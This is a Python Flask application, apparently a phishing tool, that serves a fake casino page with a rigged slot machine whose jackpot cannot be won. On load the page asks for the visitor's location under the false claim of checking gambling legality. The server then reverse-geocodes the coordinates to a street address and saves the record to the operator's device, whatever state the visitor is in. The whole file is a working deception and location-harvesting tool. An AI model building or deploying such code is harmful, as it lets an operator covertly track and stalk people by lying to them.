import os
import base64
import random
import json
from datetime import datetime
from flask import Flask, render_template_string, jsonify, request
from geopy.geocoders import Nominatim

app = Flask(__name__)

# Directory setup.
DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Camera-Phish')
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

LOCATION_FOLDER = os.path.expanduser('~/storage/downloads/LocationData')
os.makedirs(LOCATION_FOLDER, exist_ok=True)

# Define the slot symbols.
symbols = ["🧠", "💀", "🔥", "🦊"]

# Generate three unique symbols (making the jackpot impossible).
def spin_slots():
    return random.sample(symbols, 3)

# Path to your background image (casino.jpg).
BACKGROUND_IMAGE_PATH = os.path.expanduser('~/storage/downloads/Camera-Phish/casino.jpg')

# Read and encode the background image.
try:
    with open(BACKGROUND_IMAGE_PATH, "rb") as img_file:
        image_data = base64.b64encode(img_file.read()).decode("utf-8")
except Exception as e:
    app.logger.error("Error reading background image: " + str(e))
    image_data = ""  # Fallback to empty string if not found.

@app.route("/")
def home():
    return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DedSlot Casino - Play & Win Big!</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
    /* Reset and basic styling */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      /* Use casino.jpg as background via Base64 */
      background: url('data:image/jpeg;base64,{{ image_data }}') no-repeat center center fixed;
      background-size: cover;
      font-family: 'Orbitron', sans-serif;
      color: white;
      overflow: hidden;
    }
    .header {
      position: fixed; top: 0; width: 100%;
      text-align: center; padding: 10px 0;
      background: rgba(0, 0, 0, 0.7);
      font-size: 1.5em; color: cyan;
      text-shadow: 0 0 10px cyan; z-index: 2;
    }
    .container {
      position: absolute; top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.8);
      padding: 20px 30px; border-radius: 10px;
      box-shadow: 0 0 15px cyan; text-align: center;
      width: 90%; max-width: 500px;
    }
    .subtitle { font-size: 1.2em; color: yellow; margin-bottom: 15px; }
    .prize-desc { font-size: 1em; margin-bottom: 15px; }
    .free-spins { font-size: 1em; margin-bottom: 15px; color: lightgreen; }
    .slot-machine { display: flex; justify-content: center; margin: 20px 0; }
    .reel {
      width: 80px; height: 80px; font-size: 3em;
      background: black; border: 3px solid cyan;
      margin: 0 10px; display: flex; align-items: center; justify-content: center;
      transition: transform 0.5s ease-in-out;
    }
    #spinButton {
      background: red; color: white; border: none;
      padding: 10px 20px; font-size: 1.2em;
      cursor: pointer; transition: 0.3s;
    }
    #spinButton:hover { background: darkred; }
    #result { font-size: 1.5em; margin-top: 10px; }
    /* Overlay for location verification */
    .overlay {
      position: fixed; top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.9);
      display: flex;
      align-items: center; justify-content: center;
      z-index: 3;
    }
    .location-popup {
      background: black; padding: 20px 30px;
      text-align: center; border-radius: 10px;
      box-shadow: 0 0 15px cyan;
    }
  </style>
</head>
<body>
  <div class="header">DedSlot Casino - Play & Win Big!</div>
  
  <!-- Location verification overlay (shown until verified) -->
  <div class="overlay" id="locationOverlay">
    <div class="location-popup">
      <h2>Verify Your Location</h2>
      <p>We need to verify that gambling is legal in your state.</p>
      <p>Please allow location access.</p>
      <button onclick="requestLocation()">Verify Now</button>
    </div>
  </div>

  <div class="container">
    <h1>DedSlot Casino</h1>
    <p class="subtitle">Spin & Win Big! Jackpot: $300</p>
    <p class="prize-desc">
      Enjoy your 10 free spins on us! Win up to $300 – though the jackpot is impossible to win.
    </p>
    <p class="free-spins">Free Spins Left: <span id="spinsCounter">10</span></p>
    <div class="slot-machine">
      <div class="reel" id="reel1">🧠</div>
      <div class="reel" id="reel2">💀</div>
      <div class="reel" id="reel3">🔥</div>
    </div>
    <button id="spinButton" onclick="spinSlots()">SPIN</button>
    <p id="result"></p>
  </div>

  <script>
    var freeSpins = 10;
    var locationVerified = false;

    // Update the displayed free spins counter.
    function updateSpinsCounter() {
      if (freeSpins < 0) freeSpins = 0;
      document.getElementById("spinsCounter").innerText = freeSpins;
    }

    // Request location access, then send the location immediately to the backend.
    function requestLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          var data = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          };
          // Immediately send the location to be saved.
          fetch("/verify_location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
          })
          .then(response => response.json())
          .then(result => {
            // Regardless of the outcome, the location was saved immediately.
            if(result.status === "success") {
              document.getElementById("locationOverlay").style.display = "none";
              freeSpins += 100;
              updateSpinsCounter();
              locationVerified = true;
            } else {
              alert(result.message);
            }
          })
          .catch(error => {
            console.error("Error verifying location:", error);
            alert("Error verifying location.");
          });
        }, function(error) {
          alert("Location access is required to verify that gambling is legal in your state.");
        });
      } else {
        alert("Geolocation is not supported by this browser.");
      }
    }

    // Spin the slot machine if free spins remain and location is verified.
    function spinSlots() {
      if (!locationVerified) {
        alert("Please verify your location to play.");
        return;
      }
      if (freeSpins <= 0) {
        alert("No free spins left.");
        return;
      }
      freeSpins--;
      updateSpinsCounter();
      var spinButton = document.getElementById("spinButton");
      spinButton.disabled = true;

      // Get reel elements.
      const reel1 = document.getElementById("reel1");
      const reel2 = document.getElementById("reel2");
      const reel3 = document.getElementById("reel3");

      // Start the spin animation by rotating each reel.
      reel1.style.transform = "rotate(360deg)";
      reel2.style.transform = "rotate(360deg)";
      reel3.style.transform = "rotate(360deg)";

      // After 0.5 second (animation duration), update the symbols and reset rotation.
      setTimeout(() => {
        fetch("/spin")
          .then(response => response.json())
          .then(data => {
            const [symbol1, symbol2, symbol3] = data.result;
            reel1.innerText = symbol1;
            reel2.innerText = symbol2;
            reel3.innerText = symbol3;
            // Reset rotation.
            reel1.style.transform = "rotate(0deg)";
            reel2.style.transform = "rotate(0deg)";
            reel3.style.transform = "rotate(0deg)";
            const resultText = document.getElementById("result");
            if (symbol1 === symbol2 && symbol2 === symbol3) {
              resultText.innerText = "JACKPOT! You won $300!";
            } else {
              resultText.innerText = "Try again!";
            }
            spinButton.disabled = false;
          })
          .catch((error) => {
            console.error("Error during spin:", error);
            spinButton.disabled = false;
          });
      }, 500);
    }

    // Automatically request location verification on page load.
    window.onload = function() {
      requestLocation();
    };
  </script>
</body>
</html>
    """, image_data=image_data)

@app.route("/spin")
def spin():
    result = spin_slots()
    return jsonify({"result": result})

@app.route("/verify_location", methods=["POST"])
def verify_location():
    location_data = request.get_json()
    if not location_data:
        return jsonify({"status": "error", "message": "No location data provided"}), 400
    try:
        latitude = float(location_data.get("latitude"))
        longitude = float(location_data.get("longitude"))
    except Exception:
        return jsonify({"status": "error", "message": "Invalid location data"}), 400

    try:
        geolocator = Nominatim(user_agent="dedslot_location_verify")
        location = geolocator.reverse((latitude, longitude), language='en', exactly_one=True, timeout=10)
    except Exception as e:
        return jsonify({"status": "error", "message": "Error accessing geolocation service"}), 500

    # Save the location data immediately regardless of allowed state.
    date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    location_file = os.path.join(LOCATION_FOLDER, f'location_{date_str}.json')
    if location:
        location_data["address"] = location.address
        location_data["raw"] = location.raw
    else:
        location_data["address"] = "Unknown"
        location_data["raw"] = {}
    with open(location_file, 'w') as f:
        json.dump(location_data, f, indent=4)

    # Check if the location is allowed (only Nevada or New Jersey in this example).
    allowed_states = ["Nevada", "New Jersey"]
    state = ""
    country = ""
    if location:
        address = location.raw.get("address", {})
        state = address.get("state", "")
        country = address.get("country", "")
    if country != "United States" or state not in allowed_states:
        return jsonify({"status": "error", "message": "Gambling is not legal in your state."}), 403

    return jsonify({"status": "success", "message": "Location verified! You have 100 free spins."})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=True)
